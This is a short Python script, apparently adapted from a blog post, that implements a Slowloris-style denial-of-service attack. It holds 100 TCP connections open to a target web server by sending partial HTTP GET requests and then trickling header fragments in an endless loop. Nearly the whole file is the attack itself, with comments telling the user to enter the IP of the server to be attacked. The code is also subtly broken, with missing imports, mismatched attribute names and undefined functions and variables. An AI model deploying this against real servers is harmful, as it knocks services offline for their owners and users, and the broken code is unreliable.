#This code uses/builds off code found in https://medium.com/@joel.barmettler/denial-of-service-attacks-do-not-always-have-to-flood-the-server-with-requests-to-make-him-shut-c630e59b731e

#this is the server that we will attack
class DOSServer():
    #port 80 is standard for connections 
    def __init__(self, ip, port=80):
        #IP address to be attacked
        self.ip = ip
        #port of connection
        self.port = port
        #dummy header information for our get requests
        self.headers = [
            "User-Agent: Mozilla/5.0 Gecko/20091102 Chrome/3.5.5",
            "Accept-Language: en-us,en;q=0.5"
        ]


    def createSocket(self):
        try:
            #AF_INET sets the socket to communicate with IPv4 addresses
            #SOCK_STREAM creates a TCP socket
            #Need TCP connection because TCP creates a connection, vs. UCP which is connectionless
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #set socket timeout
            s.settimeout(10)
            #connect socket to the server 
            s.connect((self._ip, self._port))
            #send the data to the server
            s.send(self.getMessage("Get /?"))

            for header in self.headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        #create a new socket if there's an error with this one 
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.createSocket()

    def attack(self):
        #how long we will sleep before sending new data
        dataSleep = 3
        #how long we will run our attack
        timeout=sys.maxsize
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self.sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))
    #add functions for encryption 

numberOfSockets = 100
#change this to the IP of the server to be attacked
DOSServer= DOSServer(ip)
#create sockets based on number of sockets
DOSServer.sockets = [DOSServer.createSocket() for socket in range(numberOfSockets)]


